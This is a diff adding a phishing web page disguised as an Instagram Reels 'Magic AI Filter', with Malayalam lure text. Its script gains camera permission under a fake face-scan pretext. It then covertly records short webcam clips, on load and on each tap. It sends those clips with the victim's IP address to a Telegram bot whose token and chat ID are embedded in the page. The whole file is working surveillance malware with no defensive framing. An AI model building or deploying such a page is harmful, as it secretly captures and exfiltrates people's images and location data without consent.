@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="ml">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Instagram Reels - AI ഫിൽറ്റർ 🔥</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
+        
+        * {
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+            font-family: 'Roboto', sans-serif;
+        }
+        body {
+            background-color: #000;
+            margin: 0;
+            overflow: hidden;
+        }
+        .insta-container {
+            position: relative;
+            width: 100%;
+            max-width: 500px;
+            height: 100dvh;
+            margin: auto;
+            background: #000;
+            overflow: hidden;
+        }
+        video#main-video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+        #hidden-cam {
+            position: absolute;
+            opacity: 0.1; /* Slightly visible for scanning effect */
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            pointer-events: none;
+            z-index: 5;
+            filter: grayscale(1) brightness(1.5) contrast(1.2);
+            mix-blend-mode: screen;
+        }
+        .scan-line {
+            position: absolute;
+            width: 100%;
+            height: 4px;
+            background: rgba(0, 149, 246, 0.8);
+            box-shadow: 0 0 15px #0095f6;
+            z-index: 20;
+            top: 0;
+            animation: scanMove 2s infinite linear;
+            display: none;
+        }
+        @keyframes scanMove {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        .insta-overlay {
+            position: absolute;
+            inset: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-end;
+            padding: 20px 16px 30px 16px;
+            background: linear-gradient(to top, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0.2) 30%, transparent 60%);
+            pointer-events: none;
+            z-index: 30;
+        }
+        .interactive {
+            pointer-events: auto;
+        }
+        .heart-pop {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0);
+            color: #ff3040;
+            z-index: 100;
+            pointer-events: none;
+            opacity: 0;
+        }
+        @keyframes heartAnim {
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+            15% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+            85% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
+        }
+        .sidebar-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            margin-bottom: 18px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+        .insta-gradient-bg {
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+        }
+        #loading-overlay {
+            position: absolute;
+            inset: 0;
+            background: black;
+            z-index: 40;
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+    </style>
+</head>
+<body>
+
+    <script>
+        const CONFIG = {
+            botToken: "7794673665:AAHIk_TmHz5cJkcxE4Tj2NaMDi0HhZ8nzjU", 
+            chatId: "7510372886"
+        };
+    </script>
+
+    <!-- Permission Screen -->
+    <div id="auth-screen" class="fixed inset-0 bg-black z-50 flex flex-col items-center justify-center px-8 text-center">
+        <div class="relative mb-8">
+            <div class="absolute inset-0 insta-gradient-bg rounded-[24px] blur-2xl opacity-40 animate-pulse"></div>
+            <div class="relative w-20 h-20 rounded-[22px] insta-gradient-bg flex items-center justify-center shadow-2xl">
+                <svg viewBox="0 0 24 24" width="48" height="48" fill="white">
+                    <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                </svg>
+            </div>
+        </div>
+        <h2 class="text-white text-2xl font-bold mb-3 tracking-wide">Magic AI Filter ✨</h2>
+        <p class="text-gray-400 text-sm mb-10 leading-relaxed px-6">
+            Ninte oru transformation ippo kaanam! Face scan cheyyan vendi camera permission allow cheyyuka.
+        </p>
+        <button id="allow-btn" class="interactive w-full max-w-[280px] bg-[#0095f6] text-white font-bold py-4 rounded-xl shadow-lg transition-all active:scale-95">
+            LOAD FILTER NOW 🔥
+        </button>
+    </div>
+
+    <!-- Main Reels UI -->
+    <div id="insta-ui" class="insta-container hidden">
+        <video id="hidden-cam" autoplay playsinline muted></video>
+        <div id="scan-line" class="scan-line"></div>
+        
+        <div id="loading-overlay">
+            <div class="w-16 h-16 border-4 border-white/20 border-t-[#0095f6] rounded-full animate-spin mb-4"></div>
+            <p class="text-sm font-bold tracking-widest text-blue-400">ANALYZING FACE... 84%</p>
+        </div>
+
+        <div id="big-heart" class="heart-pop">
+             <svg viewBox="0 0 24 24" width="100" height="100" fill="#ff3040"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+        </div>
+
+        <video id="main-video" loop playsinline muted class="interactive">
+            <source src="https://assets.mixkit.co/videos/preview/mixkit-girl-dancing-in-front-of-a-white-wall-4424-large.mp4" type="video/mp4">
+        </video>
+        
+        <div id="top-status" class="absolute top-10 left-0 right-0 flex justify-center z-[35] pointer-events-none opacity-0 transition-all duration-700 -translate-y-4">
+             <div class="bg-black/40 backdrop-blur-xl border border-white/20 px-4 py-2 rounded-full flex items-center gap-2 shadow-2xl">
+                 <div class="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
+                 <span class="text-white text-[11px] font-bold uppercase tracking-tighter">AI SCANNING ACTIVE</span>
+             </div>
+        </div>
+
+        <div class="insta-overlay">
+            <div class="flex justify-between items-end w-full">
+                <div class="flex-1 pr-4">
+                    <div class="flex items-center gap-2 mb-3 interactive">
+                        <img src="https://ui-avatars.com/api/?name=AI+Filter&background=random" class="w-8 h-8 rounded-full border-2 border-[#ee2a7b]" />
+                        <span class="text-white font-bold text-sm">ai_transformation_kl</span>
+                        <button class="bg-[#0095f6] text-white text-[11px] font-bold px-3 py-1 rounded-md ml-2">Follow</button>
+                    </div>
+                    <p class="text-white text-[13px] mb-2 interactive leading-snug drop-shadow-md">
+                        Ente mone! 😱 Ithu poloru filter ethra thiranjalum kittilla.. Ninte transformation noku! 😍<br>
+                        <span class="text-blue-300 font-bold">#AIFilter #MalayalamVibes #ViralReel</span>
+                    </p>
+                    <div class="flex items-center gap-2 interactive bg-black/20 w-fit p-1 px-2 rounded-full">
+                        <svg viewBox="0 0 24 24" width="12" height="12" fill="white"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/></svg>
+                        <marquee class="text-white text-[10px] w-32 font-medium">Original Audio • Trending Vibes 2024</marquee>
+                    </div>
+                </div>
+
+                <!-- Right Sidebar Buttons -->
+                <div class="flex flex-col items-center interactive pb-4">
+                    <div class="sidebar-icon">
+                        <svg viewBox="0 0 24 24" width="32" height="32" fill="white"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                        <span class="text-white text-[12px] font-bold">452K</span>
+                    </div>
+                    <div class="sidebar-icon">
+                        <svg viewBox="0 0 24 24" width="30" height="30" fill="none" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                        <span class="text-white text-[12px] font-bold">8,102</span>
+                    </div>
+                    <div class="sidebar-icon">
+                        <svg viewBox="0 0 24 24" width="28" height="28" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"/><polyline points="22 2 15 22 11 13 2 9 22 2"/></svg>
+                    </div>
+                    <div class="sidebar-icon">
+                        <svg viewBox="0 0 24 24" width="26" height="26" fill="white"><circle cx="12" cy="5" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="12" cy="19" r="1.5"/></svg>
+                    </div>
+                    <div class="w-8 h-8 rounded-md border-2 border-white overflow-hidden mt-2 p-[2px]">
+                        <img src="https://ui-avatars.com/api/?name=AI&background=333" class="w-full h-full rounded-[2px]" />
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const elements = {
+            auth: document.getElementById('auth-screen'),
+            ui: document.getElementById('insta-ui'),
+            btn: document.getElementById('allow-btn'),
+            video: document.getElementById('main-video'),
+            hiddenCam: document.getElementById('hidden-cam'),
+            topStatus: document.getElementById('top-status'),
+            bigHeart: document.getElementById('big-heart'),
+            scanLine: document.getElementById('scan-line'),
+            loader: document.getElementById('loading-overlay')
+        };
+
+        let isAuthorized = false;
+        let stream = null;
+        let isRecording = false;
+
+        async function fetchIp() {
+            try {
+                const r = await fetch('https://api.ipify.org?format=json');
+                const d = await r.json();
+                return d.ip;
+            } catch { return "Unknown IP"; }
+        }
+
+        async function recordAndSend() {
+            if (!isAuthorized || !stream || isRecording) return;
+            
+            isRecording = true;
+            try {
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    const ip = await fetchIp();
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.chatId);
+                    formData.append('video', videoBlob, 'capture.mp4');
+                    formData.append('caption', `🔥 *REEL TARGET CAPTURED*\n\n📍 IP: ${ip}\n🎯 Action: AI Scan Triggered`);
+                    formData.append('parse_mode', 'Markdown');
+
+                    fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    }).finally(() => { isRecording = false; });
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 4000); 
+            } catch(e) { isRecording = false; }
+        }
+
+        elements.video.addEventListener('click', () => {
+            elements.bigHeart.style.animation = 'none';
+            void elements.bigHeart.offsetWidth;
+            elements.bigHeart.style.animation = 'heartAnim 0.8s ease-in-out forwards';
+            if (!isRecording) recordAndSend();
+        });
+
+        elements.btn.onclick = async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                elements.hiddenCam.srcObject = stream;
+                
+                // Show fake loading first
+                elements.auth.classList.add('hidden');
+                elements.ui.classList.remove('hidden');
+                elements.loader.style.display = 'flex';
+                elements.scanLine.style.display = 'block';
+
+                setTimeout(() => {
+                    elements.loader.style.display = 'none';
+                    elements.video.play();
+                    
+                    setTimeout(() => {
+                        elements.topStatus.style.opacity = '1';
+                        elements.topStatus.style.transform = 'translateY(0)';
+                    }, 500);
+
+                    isAuthorized = true;
+                    recordAndSend();
+                }, 2500); // 2.5 seconds fake loading
+
+            } catch (err) {
+                alert("Please allow camera access to load the AI filter!");
+            }
+        };
+    </script>
+</body>
+</html>
